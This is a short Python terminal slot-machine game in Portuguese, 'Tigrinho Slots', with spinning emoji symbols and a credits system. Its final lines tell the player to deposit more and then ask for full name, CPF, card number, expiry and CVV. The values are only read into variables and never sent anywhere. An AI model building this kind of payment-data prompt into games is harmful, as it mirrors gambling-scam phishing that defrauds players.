import random
import time

# Símbolos da máquina
simbolos = ["🍒", "🍋", "🍉", "⭐", "🔔", "💎"]

# Função que sorteia os símbolos
def rodar():
    return random.choice(simbolos), random.choice(simbolos), random.choice(simbolos)

# Animação de rolagem
def animacao_rolagem():
    for _ in range(10):  # Número de "gira-gira"
        roleta = [random.choice(simbolos) for _ in range(3)]
        print("\r" + " | ".join(roleta), end="")
        time.sleep(0.1)
    print()

# Início do jogo
creditos = 10
historico = []

print("🎰 Bem-vindo ao Tigrinho Slots! 🎰")
print("Você começa com 10 créditos.")
print("Boa sorte!\n")

# Loop principal do jogo
while creditos > 0:
    input(f"\n🪙 Créditos: {creditos} | Aperte Enter para girar...")
    creditos -= 1

    animacao_rolagem()
    r1, r2, r3 = rodar()
    resultado = f"{r1} | {r2} | {r3}"
    print(resultado)

    if r1 == r2 == r3:
        print("🎉 3 iguais! Tigrinho PAGOU 5 créditos! 💰")
        creditos += 5
        historico.append((resultado, "3 iguais"))
    elif r1 == r2 or r2 == r3 or r1 == r3:
        print("👍 2 iguais! Ganhou 1 crédito!")
        creditos += 1
        historico.append((resultado, "2 iguais"))
    else:
        print("🙁 Nada dessa vez.")
        historico.append((resultado, "Nada"))

# Fim do jogo
print("\n💸 Você ficou sem créditos! Fim de jogo.")
print("\n📜 Histórico de jogadas:")
for i, (res, status) in enumerate(historico, 1):
    print(f"{i:02d}. {res} --> {status}")

print("\nObrigado por jogar o Tigrinho Slots! 🐯🎰\n Deposite mais créditos para continuar jogando.")

nome = input('Digite seu nome completo: ')
cpf = int(input('Digite seu CPF: '))
cod = int(input('Digite o número do seu cartão: '))
val = input('Digite a validade do seu cartão: DD/MM/AA')
cvv = int(input('Digite seu CVV'))